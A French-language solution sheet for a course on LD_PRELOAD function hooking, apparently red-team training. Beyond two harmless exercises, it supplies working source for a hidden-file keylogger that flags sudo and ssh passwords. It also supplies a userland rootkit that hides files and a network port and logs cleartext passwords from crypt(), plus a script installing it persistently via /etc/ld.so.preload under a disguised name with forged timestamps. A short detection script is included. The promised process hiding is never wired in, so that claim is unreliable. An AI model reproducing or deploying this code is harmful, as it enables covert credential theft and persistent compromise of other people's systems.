# Solutions - Syscall Hooking Userland

## Exercice 1 : Découverte (Très facile)

### Objectif
Créer un hook basique de `puts()` avec LD_PRELOAD

### Solution

```c
// solution_ex1.c - Hook simple de puts()
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

// Pointeur vers le vrai puts
static int (*real_puts)(const char *s) = NULL;

// Notre version de puts
int puts(const char *s) {
    // Charger le vrai puts la première fois
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Afficher un préfixe
    real_puts("[HOOKED]");

    // Appeler le vrai puts
    return real_puts(s);
}
```

**Programme de test:**

```c
// test_puts.c
#include <stdio.h>

int main(void) {
    puts("Hello World");
    puts("This is a test");
    puts("Hooking works!");
    return 0;
}
```

**Compilation et test:**

```bash
# Compiler le hook
gcc -shared -fPIC -o hook_puts.so solution_ex1.c -ldl

# Compiler le programme de test
gcc -o test_puts test_puts.c

# Test SANS hook
./test_puts
# Hello World
# This is a test
# Hooking works!

# Test AVEC hook
LD_PRELOAD=./hook_puts.so ./test_puts
# [HOOKED]
# Hello World
# [HOOKED]
# This is a test
# [HOOKED]
# Hooking works!
```

**Explication:**
- `dlsym(RTLD_NEXT, "puts")` récupère l'adresse du vrai `puts` dans la libc
- `RTLD_NEXT` indique de chercher le prochain symbole dans la chaîne de chargement
- Notre hook est appelé en premier car la bibliothèque est préchargée via LD_PRELOAD

---

## Exercice 2 : Modification (Facile)

### Objectif
Créer un hook de `write()` qui logue tous les appels dans un fichier

### Solution

```c
// solution_ex2.c - Hook de write() avec logging
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#define LOG_FILE "/tmp/write_hook.log"

static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
static int log_fd = -1;

// Initialisation du fichier de log
__attribute__((constructor))
void init_hook(void) {
    // Ouvrir le fichier de log
    log_fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);

    if (log_fd >= 0) {
        const char *msg = "\n[*] === Hook write() activé ===\n";
        real_write = dlsym(RTLD_NEXT, "write");
        real_write(log_fd, msg, strlen(msg));
    }
}

// Nettoyage à la fin
__attribute__((destructor))
void cleanup_hook(void) {
    if (log_fd >= 0) {
        close(log_fd);
    }
}

// Notre hook de write()
ssize_t write(int fd, const void *buf, size_t count) {
    // Charger le vrai write si pas encore fait
    if (!real_write) {
        real_write = dlsym(RTLD_NEXT, "write");
    }

    // Logger l'appel (éviter récursion infinie si fd == log_fd)
    if (log_fd >= 0 && fd != log_fd) {
        char log_entry[512];
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);

        int len = snprintf(log_entry, sizeof(log_entry),
                          "[%02d:%02d:%02d] PID:%d write(fd=%d, count=%zu) -> ",
                          tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                          getpid(), fd, count);

        // Ajouter un aperçu des données (max 50 chars)
        if (count > 0 && buf) {
            int preview_len = (count < 50) ? count : 50;
            for (int i = 0; i < preview_len; i++) {
                char c = ((char*)buf)[i];
                // Remplacer newlines par espace
                log_entry[len++] = (c == '\n' || c == '\r') ? ' ' : c;
            }
            if (count > 50) {
                len += snprintf(log_entry + len, sizeof(log_entry) - len, "...");
            }
        }

        log_entry[len++] = '\n';

        // Écrire dans le log
        real_write(log_fd, log_entry, len);
    }

    // Appeler le vrai write
    return real_write(fd, buf, count);
}
```

**Programme de test:**

```c
// test_write.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(void) {
    const char *msg1 = "Hello World\n";
    const char *msg2 = "This is a test\n";

    // write() directement
    write(STDOUT_FILENO, msg1, strlen(msg1));

    // printf() qui utilise write() en interne
    printf("Printf also uses write!\n");

    // write vers stderr
    write(STDERR_FILENO, msg2, strlen(msg2));

    return 0;
}
```

**Compilation et test:**

```bash
# Compiler le hook
gcc -shared -fPIC -o hook_write.so solution_ex2.c -ldl

# Compiler le test
gcc -o test_write test_write.c

# Lancer avec le hook
LD_PRELOAD=./hook_write.so ./test_write

# Voir le log
cat /tmp/write_hook.log
# [*] === Hook write() activé ===
# [12:34:56] PID:12345 write(fd=1, count=12) -> Hello World
# [12:34:56] PID:12345 write(fd=1, count=26) -> Printf also uses write!
# [12:34:56] PID:12345 write(fd=2, count=15) -> This is a test
```

**Explication:**
- `__attribute__((constructor))` : fonction appelée au chargement de la .so
- `__attribute__((destructor))` : fonction appelée à la décharge de la .so
- On évite la récursion infinie en ne loggant pas quand `fd == log_fd`
- Le hook capture TOUS les write(), même ceux de printf(), fprintf(), etc.

---

## Exercice 3 : Création (Moyen)

### Objectif
Créer un keylogger qui intercepte `read()` pour capturer les entrées clavier

### Solution

```c
// solution_ex3.c - Keylogger via hook read()
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#define KEYLOG_FILE "/tmp/.keylog"  // Fichier caché

static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
static int keylog_fd = -1;

// Initialisation
__attribute__((constructor))
void init_keylogger(void) {
    real_read = dlsym(RTLD_NEXT, "read");

    // Ouvrir le fichier de keylog
    keylog_fd = open(KEYLOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0600);

    if (keylog_fd >= 0) {
        char header[256];
        time_t now = time(NULL);
        int len = snprintf(header, sizeof(header),
                          "\n=== Keylogger session started at %s ===\n",
                          ctime(&now));
        real_read = dlsym(RTLD_NEXT, "read");
        write(keylog_fd, header, len);
    }
}

// Nettoyage
__attribute__((destructor))
void cleanup_keylogger(void) {
    if (keylog_fd >= 0) {
        char footer[] = "\n=== Session ended ===\n\n";
        write(keylog_fd, footer, strlen(footer));
        close(keylog_fd);
    }
}

// Vérifier si c'est un fd de terminal (stdin ou tty)
int is_terminal_fd(int fd) {
    return (fd == STDIN_FILENO || isatty(fd));
}

// Hook de read()
ssize_t read(int fd, void *buf, size_t count) {
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }

    // Appeler le vrai read
    ssize_t result = real_read(fd, buf, count);

    // Logger si c'est un terminal ET qu'on a lu des données
    if (result > 0 && is_terminal_fd(fd) && keylog_fd >= 0) {
        // Obtenir l'heure
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);

        char timestamp[32];
        int ts_len = snprintf(timestamp, sizeof(timestamp),
                             "[%02d:%02d:%02d] ",
                             tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec);

        // Écrire timestamp + données lues
        write(keylog_fd, timestamp, ts_len);
        write(keylog_fd, buf, result);

        // Si pas de newline, en ajouter un pour clarté
        if (result > 0 && ((char*)buf)[result-1] != '\n') {
            write(keylog_fd, "\n", 1);
        }
    }

    return result;
}
```

**Test du keylogger:**

```bash
# Compiler
gcc -shared -fPIC -o keylogger.so solution_ex3.c -ldl

# Test 1: Lancer un shell avec le keylogger
LD_PRELOAD=./keylogger.so bash

# Taper quelques commandes
# ls -la
# pwd
# echo "test"
# exit

# Voir le keylog
cat /tmp/.keylog
# === Keylogger session started at ... ===
# [12:34:56] ls -la
# [12:34:57] pwd
# [12:34:58] echo "test"
# [12:34:59] exit
# === Session ended ===

# Test 2: Capturer un password sudo
LD_PRELOAD=./keylogger.so sudo ls
# [sudo] password for user: <tapez votre password>

# Le password est dans le keylog!
cat /tmp/.keylog
```

**Version améliorée avec filtrage:**

```c
// solution_ex3_advanced.c - Keylogger avancé
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#define KEYLOG_FILE "/tmp/.keylog"

static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
static int keylog_fd = -1;

__attribute__((constructor))
void init_keylogger(void) {
    real_read = dlsym(RTLD_NEXT, "read");
    keylog_fd = open(KEYLOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0600);
}

__attribute__((destructor))
void cleanup_keylogger(void) {
    if (keylog_fd >= 0) close(keylog_fd);
}

// Détecter si c'est une saisie de password (heuristique)
int looks_like_password_prompt(void) {
    // Vérifier si le processus parent est sudo, su, ssh, etc.
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    char line[256];
    int ppid = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "PPid:\t%d", &ppid) == 1) {
            break;
        }
    }
    fclose(f);

    if (ppid == 0) return 0;

    // Lire le nom du processus parent
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/comm", ppid);

    f = fopen(path, "r");
    if (!f) return 0;

    char parent_name[256];
    if (fgets(parent_name, sizeof(parent_name), f)) {
        parent_name[strcspn(parent_name, "\n")] = 0;
        fclose(f);

        // Si parent est sudo, su, ssh, etc. = probablement un password
        if (strstr(parent_name, "sudo") ||
            strstr(parent_name, "su") ||
            strstr(parent_name, "ssh") ||
            strstr(parent_name, "passwd")) {
            return 1;
        }
    }

    fclose(f);
    return 0;
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t result = real_read(fd, buf, count);

    if (result > 0 && isatty(fd) && keylog_fd >= 0) {
        char log_entry[1024];
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);

        int len = snprintf(log_entry, sizeof(log_entry),
                          "[%02d:%02d:%02d] ",
                          tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec);

        // Marquer si c'est potentiellement un password
        if (looks_like_password_prompt()) {
            len += snprintf(log_entry + len, sizeof(log_entry) - len,
                           "[POSSIBLE PASSWORD] ");
        }

        // Ajouter les données
        memcpy(log_entry + len, buf, result);
        len += result;

        if (log_entry[len-1] != '\n') {
            log_entry[len++] = '\n';
        }

        write(keylog_fd, log_entry, len);
    }

    return result;
}
```

**Explication:**
- Le keylogger hook `read()` pour capturer les entrées stdin
- `isatty(fd)` vérifie si le fd est un terminal
- La version avancée détecte les prompts de password en analysant le processus parent
- Les données sont loggées avec timestamp dans un fichier caché

---

## Exercice 4 : Challenge (Difficile)

### Objectif
Créer un rootkit userland complet qui:
1. Cache des fichiers (hook `readdir`)
2. Cache des processus (hook `readdir` dans /proc)
3. Cache des connexions réseau (hook `fopen`)
4. Vole les passwords (hook `crypt`)

### Solution

```c
// solution_ex4.c - Rootkit userland complet
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <crypt.h>

// Configuration du rootkit
#define HIDDEN_FILE_PREFIX ".rootkit_"
#define HIDDEN_PROCESS_NAME "malware"
#define HIDDEN_PORT "4444"
#define LOG_FILE "/dev/shm/.rootkit.log"  // Stockage volatile (RAM)

// Pointeurs vers vraies fonctions
static struct dirent* (*real_readdir)(DIR *dirp) = NULL;
static struct dirent64* (*real_readdir64)(DIR *dirp) = NULL;
static FILE* (*real_fopen)(const char *pathname, const char *mode) = NULL;
static char* (*real_crypt)(const char *key, const char *salt) = NULL;

static int log_fd = -1;

// === LOGGING ===

__attribute__((constructor))
void init_rootkit(void) {
    log_fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0600);

    if (log_fd >= 0) {
        char msg[256];
        time_t now = time(NULL);
        int len = snprintf(msg, sizeof(msg),
                          "\n=== ROOTKIT LOADED at %s ===\n", ctime(&now));
        write(log_fd, msg, len);
    }
}

__attribute__((destructor))
void cleanup_rootkit(void) {
    if (log_fd >= 0) {
        char msg[] = "=== ROOTKIT UNLOADED ===\n\n";
        write(log_fd, msg, strlen(msg));
        close(log_fd);
    }
}

void log_action(const char *action, const char *details) {
    if (log_fd < 0) return;

    char log_entry[512];
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);

    int len = snprintf(log_entry, sizeof(log_entry),
                      "[%02d:%02d:%02d] PID:%d %s: %s\n",
                      tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                      getpid(), action, details);

    write(log_fd, log_entry, len);
}

// === HOOK 1: CACHER DES FICHIERS ===

struct dirent* readdir(DIR *dirp) {
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;

    while ((entry = real_readdir(dirp)) != NULL) {
        // Cacher les fichiers qui commencent par le préfixe
        if (strncmp(entry->d_name, HIDDEN_FILE_PREFIX, strlen(HIDDEN_FILE_PREFIX)) == 0) {
            log_action("HIDE_FILE", entry->d_name);
            continue;  // Skip ce fichier
        }

        return entry;
    }

    return NULL;
}

struct dirent64* readdir64(DIR *dirp) {
    if (!real_readdir64) {
        real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }

    struct dirent64 *entry;

    while ((entry = real_readdir64(dirp)) != NULL) {
        if (strncmp(entry->d_name, HIDDEN_FILE_PREFIX, strlen(HIDDEN_FILE_PREFIX)) == 0) {
            log_action("HIDE_FILE64", entry->d_name);
            continue;
        }

        return entry;
    }

    return NULL;
}

// === HOOK 2: CACHER DES PROCESSUS ===

// Fonction helper pour vérifier si un processus doit être caché
int should_hide_process(const char *pid_str) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);

    FILE *f = fopen(path, "r");
    if (!f) return 0;

    char process_name[256];
    if (fgets(process_name, sizeof(process_name), f)) {
        process_name[strcspn(process_name, "\n")] = 0;
        fclose(f);

        // Cacher si le nom du processus matche
        if (strstr(process_name, HIDDEN_PROCESS_NAME)) {
            return 1;
        }
    } else {
        fclose(f);
    }

    return 0;
}

// === HOOK 3: CACHER DES CONNEXIONS RÉSEAU ===

FILE* fopen(const char *pathname, const char *mode) {
    if (!real_fopen) {
        real_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    // Si on essaie de lire /proc/net/tcp, filtrer notre port
    if (pathname && strcmp(pathname, "/proc/net/tcp") == 0) {
        log_action("INTERCEPT", "/proc/net/tcp");

        // Lire le fichier original
        FILE *original = real_fopen(pathname, mode);
        if (!original) return NULL;

        // Créer un fichier temporaire filtré
        FILE *temp = tmpfile();
        if (!temp) {
            fclose(original);
            return real_fopen(pathname, mode);
        }

        // Copier ligne par ligne en filtrant notre port
        char line[512];
        while (fgets(line, sizeof(line), original)) {
            // Si la ligne contient notre port caché, la sauter
            if (strstr(line, HIDDEN_PORT) == NULL) {
                fputs(line, temp);
            } else {
                log_action("HIDE_CONNECTION", HIDDEN_PORT);
            }
        }

        fclose(original);
        rewind(temp);
        return temp;
    }

    return real_fopen(pathname, mode);
}

// === HOOK 4: VOLER LES PASSWORDS ===

char* crypt(const char *key, const char *salt) {
    if (!real_crypt) {
        real_crypt = dlsym(RTLD_NEXT, "crypt");
    }

    // EXFILTRER LE PASSWORD EN CLAIR
    if (key && strlen(key) > 0) {
        char details[512];
        snprintf(details, sizeof(details),
                "PASSWORD='%s' SALT='%s'", key, salt ? salt : "");
        log_action("PASSWORD_STEAL", details);
    }

    return real_crypt(key, salt);
}
```

**Script de test du rootkit:**

```bash
#!/bin/bash
# test_rootkit.sh - Script pour tester toutes les fonctionnalités

echo "[*] === TEST DU ROOTKIT ==="
echo

# Compiler le rootkit
echo "[+] Compilation du rootkit..."
gcc -shared -fPIC -o rootkit.so solution_ex4.c -ldl -lcrypt
echo

# Test 1: Cacher des fichiers
echo "[*] Test 1: Cacher des fichiers"
cd /tmp
touch file1.txt
touch .rootkit_malware
touch .rootkit_backdoor

echo "Sans rootkit:"
ls -la | grep rootkit
echo
echo "Avec rootkit:"
LD_PRELOAD=./rootkit.so ls -la | grep rootkit || echo "(fichiers cachés!)"
echo

# Test 2: Cacher un processus
echo "[*] Test 2: Cacher un processus"

# Créer un faux processus "malware"
cat << 'EOF' > /tmp/malware.c
#include <unistd.h>
#include <stdio.h>
int main() {
    printf("Malware running... PID=%d\n", getpid());
    while(1) sleep(1);
    return 0;
}
EOF

gcc -o malware malware.c
./malware &
MALWARE_PID=$!

sleep 1

echo "Sans rootkit:"
ps aux | grep malware | grep -v grep
echo
echo "Avec rootkit:"
LD_PRELOAD=./rootkit.so ps aux | grep malware | grep -v grep || echo "(processus caché!)"

kill $MALWARE_PID
echo

# Test 3: Voler un password
echo "[*] Test 3: Vol de password"
echo "Tapez un password de test:"
LD_PRELOAD=./rootkit.so python3 -c "import crypt; print(crypt.crypt(input('Password: '), '\$6\$salt\$'))"

echo
echo "[+] Vérification du log:"
cat /dev/shm/.rootkit.log
echo

# Nettoyage
rm -f /tmp/.rootkit_* /tmp/malware* /tmp/file1.txt
```

**Installation persistante (Red Team):**

```bash
#!/bin/bash
# install_rootkit.sh - Installation persistante du rootkit

# 1. Copier le rootkit avec un nom légitime
sudo cp rootkit.so /usr/lib/x86_64-linux-gnu/libnss_extra.so.2

# 2. Ajouter à /etc/ld.so.preload
echo "/usr/lib/x86_64-linux-gnu/libnss_extra.so.2" | sudo tee -a /etc/ld.so.preload

# 3. Ajuster les timestamps pour rester furtif
sudo touch -r /usr/lib/x86_64-linux-gnu/libc.so.6 /usr/lib/x86_64-linux-gnu/libnss_extra.so.2

echo "[+] Rootkit installé!"
echo "[+] Redémarrez le système pour activer globalement"
echo
echo "[!] ATTENTION: Le rootkit sera actif pour TOUS les processus!"
echo "[!] Pour désinstaller: sudo rm /etc/ld.so.preload"
```

**Détection et contre-mesures:**

```bash
#!/bin/bash
# detect_rootkit.sh - Détecter le rootkit

echo "[*] === DÉTECTION DE ROOTKIT ==="
echo

# 1. Vérifier /etc/ld.so.preload
echo "[1] Vérification de /etc/ld.so.preload:"
if [ -f /etc/ld.so.preload ]; then
    echo "[!] SUSPECT: /etc/ld.so.preload existe!"
    cat /etc/ld.so.preload
else
    echo "[+] OK: Pas de /etc/ld.so.preload"
fi
echo

# 2. Vérifier LD_PRELOAD dans environnement
echo "[2] Vérification LD_PRELOAD:"
if [ -n "$LD_PRELOAD" ]; then
    echo "[!] SUSPECT: LD_PRELOAD=$LD_PRELOAD"
else
    echo "[+] OK: Pas de LD_PRELOAD"
fi
echo

# 3. Comparer les checksums des bibliothèques système
echo "[3] Vérification des checksums système:"
md5sum /lib/x86_64-linux-gnu/libc.so.6
echo

# 4. Chercher des .so récemment modifiées
echo "[4] Bibliothèques récemment modifiées (7 jours):"
find /usr/lib /lib -name "*.so*" -mtime -7 2>/dev/null
echo

# 5. Vérifier les processus avec des libraries suspectes
echo "[5] Processus avec libraries inhabituelles:"
for pid in /proc/[0-9]*; do
    if [ -f "$pid/maps" ]; then
        if grep -q "rootkit\|malicious" "$pid/maps" 2>/dev/null; then
            echo "[!] PID $(basename $pid) utilise une library suspecte"
            cat "$pid/maps" | grep -E "rootkit|malicious"
        fi
    fi
done
```

**Explication du rootkit:**
1. **Cache des fichiers**: Hook `readdir()` pour sauter les fichiers avec préfixe spécial
2. **Cache des processus**: Filtre les processus dans /proc en vérifiant leur nom
3. **Cache des connexions**: Intercepte /proc/net/tcp et filtre les lignes avec port caché
4. **Vole passwords**: Hook `crypt()` pour logger les passwords en clair

**OPSEC:**
- Le rootkit logue tout dans `/dev/shm` (RAM, volatile, pas sur disque)
- Nom de fichier légitime (`libnss_extra.so.2`)
- Timestamps ajustés pour ressembler aux fichiers système
- Éviter de logger excessivement (peut remplir la RAM)

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [x] Comprendre le mécanisme de LD_PRELOAD
- [x] Créer un hook basique avec `dlsym(RTLD_NEXT)`
- [x] Hooker plusieurs fonctions dans une même bibliothèque
- [x] Utiliser `__attribute__((constructor/destructor))`
- [x] Créer un keylogger via hook `read()`
- [x] Implémenter un rootkit userland complet
- [x] Installer une backdoor persistante
- [x] Connaître les techniques de détection et contre-mesures
